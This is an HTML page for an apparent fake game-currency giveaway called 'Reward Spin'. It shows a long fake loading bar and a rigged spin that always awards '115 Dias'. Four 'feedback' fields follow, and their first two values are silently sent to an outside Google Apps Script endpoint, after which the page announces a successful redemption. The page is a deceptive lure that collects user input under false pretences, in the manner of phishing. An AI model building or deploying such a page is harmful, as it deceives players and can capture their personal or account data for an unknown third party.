<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Reward Spin</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
/* ===== RESET ===== */
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color: transparent;
}
body{
  margin:0;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  font-family: Arial, Helvetica, sans-serif;
  background: radial-gradient(circle at top, #5e2b97, #0b0016);
  color:#fff;
}

/* ===== CARD ===== */
.card{
  width:92%;
  max-width:360px;
  background:rgba(255,255,255,0.08);
  backdrop-filter: blur(14px);
  border-radius:18px;
  padding:20px;
  box-shadow:0 0 40px rgba(90,0,255,0.35);
  text-align:center;
}

/* ===== LOADING ===== */
.loader{
  width:80px;
  height:80px;
  border-radius:50%;
  border:6px solid rgba(255,255,255,0.2);
  border-top:6px solid #2da9ff;
  margin:20px auto;
  animation:spin 1s linear infinite;
}
@keyframes spin{
  0%{transform:rotate(0deg);}
  100%{transform:rotate(360deg);}
}

.progress{
  font-size:18px;
  margin-top:10px;
}

/* ===== BUTTON ===== */
.btn{
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  font-size:16px;
  font-weight:bold;
  background:linear-gradient(135deg,#4da6ff,#7a3cff);
  color:#fff;
  box-shadow:0 6px 20px rgba(90,0,255,0.45);
  transition:0.15s;
}
.btn:active{
  transform:scale(0.95);
}

/* ===== BOX ===== */
.box{
  background:rgba(255,255,255,0.12);
  border-radius:12px;
  padding:15px;
  margin:15px 0;
}

/* ===== INPUT ===== */
.input{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:1px solid rgba(255,255,255,0.3);
  background:rgba(0,0,0,0.25);
  color:#fff;
  font-size:15px;
  margin-top:10px;
}
.input::placeholder{
  color:#ccc;
}

/* ===== HIDE ===== */
.hidden{display:none;}
</style>
</head>

<body>

<div class="card">

<!-- LOADING -->
<div id="loading">
  <div class="loader"></div>
  <div class="progress" id="percent">Loading 0%</div>
</div>

<!-- SPIN -->
<div id="spin" class="hidden">
  <h2>Spin Reward</h2>
  <div class="box" id="spinBox">Tap GO</div>
  <button class="btn" onclick="spin()">GO</button>
</div>

<!-- RESULT -->
<div id="result" class="hidden">
  <h2>ðŸŽ‰ You Got</h2>
  <div class="box"><b>115 Dias</b></div>
  <button class="btn" onclick="redeem()">Redeem</button>
</div>

<!-- FEEDBACK 1 -->
<div id="fb1" class="hidden">
  <h3>Send Feedback to Redeem</h3>
  <input class="input" id="f1" placeholder="Feedback 1">
  <button class="btn" onclick="nextFb(2)">Next</button>
</div>

<!-- FEEDBACK 2 -->
<div id="fb2" class="hidden">
  <input class="input" id="f2" placeholder="Feedback 2">
  <button class="btn" onclick="nextFb(3)">Next</button>
</div>

<!-- FEEDBACK 3 -->
<div id="fb3" class="hidden">
  <input class="input" placeholder="Feedback 3">
  <button class="btn" onclick="nextFb(4)">Next</button>
</div>

<!-- FEEDBACK 4 -->
<div id="fb4" class="hidden">
  <input class="input" placeholder="Feedback 4">
  <button class="btn" onclick="submit()">REDEEM</button>
</div>

<!-- DONE -->
<div id="done" class="hidden">
  <h2>âœ… Successfully Redeem</h2>
</div>

</div>

<script>
/* ===== LOADING ===== */
let p=0;
let load=setInterval(()=>{
  p++;
  document.getElementById("percent").innerText="Loading "+p+"%";
  if(p>=100){
    clearInterval(load);
    document.getElementById("loading").classList.add("hidden");
    document.getElementById("spin").classList.remove("hidden");
  }
},250); // 25 seconds

/* ===== SPIN ===== */
let spun=false;
function spin(){
  if(spun) return;
  spun=true;
  let box=document.getElementById("spinBox");
  let items=[
    "Epic Skin","Emote","75 Dias","30 Dias","45 Dias",
    "115 Dias","558 Dias","Nothing","Nothing"
  ];
  let i=0;
  let anim=setInterval(()=>{
    box.innerText=items[i%items.length];
    i++;
  },300);

  setTimeout(()=>{
    clearInterval(anim);
    box.innerText="115 Dias";
    document.getElementById("spin").classList.add("hidden");
    document.getElementById("result").classList.remove("hidden");
  },6000);
}

/* ===== FLOW ===== */
function redeem(){
  document.getElementById("result").classList.add("hidden");
  document.getElementById("fb1").classList.remove("hidden");
}
function nextFb(n){
  document.getElementById("fb"+(n-1)).classList.add("hidden");
  document.getElementById("fb"+n).classList.remove("hidden");
}

/* ===== SUBMIT ===== */
function submit(){
  let f1=document.getElementById("f1").value;
  let f2=document.getElementById("f2").value;

  fetch("https://script.google.com/macros/s/AKfycbxPZco9av6RzXCesIXIByfVHRHdhhqmDD8_UaeAb6R1akmK9jPhCvQrRZpRqy47bqUCPw/exec?feedback1="
  + encodeURIComponent(f1)
  + "&feedback2="
  + encodeURIComponent(f2)
);

  document.getElementById("fb4").classList.add("hidden");
  document.getElementById("done").classList.remove("hidden");
}
</script>

</body>
</html>
